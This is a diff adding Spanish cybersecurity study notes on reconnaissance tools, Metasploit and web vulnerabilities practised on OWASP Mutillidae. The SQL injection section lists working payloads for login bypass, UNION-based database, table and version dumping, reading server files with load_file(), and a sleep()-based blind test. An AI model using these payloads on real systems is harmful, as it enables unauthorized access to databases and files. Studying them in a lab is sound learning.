@@ -1,0 +1,77 @@
+Ciberseguridad apuntes
+
+recopilacion pasiva: shodan, censys, whois, theHarvester, maltego, recon-ng
+
+recopilacion semi-pasiva: 
+
+	analisis de datos:
+		foca, metagoofil, exiftool 
+		centralops
+		dnsdumpster
+recopilacion activa de informacion:
+	nmap
+	amap
+	
+informacion importante: 
+	-CVE:	Informacion e identificacion de vulneravilidades cve.mitre.org		
+	-CVSS:	metricas referente a CVE https://www.nist.gov/
+	-CPE:	Identifica el SW que afecta el CVE
+	cvedetails: pagina que aglutina toda la informacion en una sola pagina	
+	
+nesus: escaneo automatico y automatizacion de vulnerabilidades
+
+metasploit:
+	carpeta : /usr/share/metasploit-framework
+	
+sudo grep '^[0-9]' windows.txt | cut -d"/" -f1 | sort -u | xargs | tr ' ' ',' > puertoswindows_tcp.txt
+
+
+
+msfvenom: generador de payloads
+
+
+Vulnerabilidades WEB:
+	-Para esto utilizaremos OWASP Mutillidae 2
+	
+	Inyección de codigo:
+		Si no tenemos un punto de entrada por ejemplo un formulario, lo mejor seria vulnerabilidades de host.
+		
+		Normalmente tendremos 3 puntos de inyección, los parametros que contenga una url, que vayan en el boby de la petición y cookies
+		
+	utilidades:
+		skipfhish: permite descubrir las paginas, esto hara que burnsuite permite ver las paginas que hay
+		skipfish -YO -o rutadestino url 
+		
+		{ Canario } palabra clave que se inyecta en el codigo para comprobar que nuestro codigo se a inyectado
+		
+		
+
+	sqli:
+		como identificarlos:
+			- inyectar un caracter: una comilla simple ', un parentesis )( 
+				si es vulnerable, podemos probar: ' or 1=1 # , esto nos logueara con el primer usuario que mache la sentencia sql
+				
+				'  union select null,database() ,null,null,null,null,null#	------> esto mostrara la base de datos, que contiene 7 columnas
+				' union select null,version() ,null,null,null,null,null#	------> la version 
+				' union select null,table_name ,null,null,null,null,null from information_schema.tables # -----> imprime las tablas
+				' union select null,@@secure_file_priv,null,null,null,null,null #	-----> ruta donde se almacenan archivos sql 
+				' union select null,load_file('/var/lib/mysql-files/importante.txt'),null,null,null,null,null # ------> leera el archivo
+	
+			blind sqli 
+				' union select null,sleep(7),null,null,null,null,null # -----> si se tarda los segundos en ejecutar es vulnerable
+				
+			sqlmap:
+				
+	xss
+
+
+
+
+
+	
+	
+	
+	
+	
+	
+	
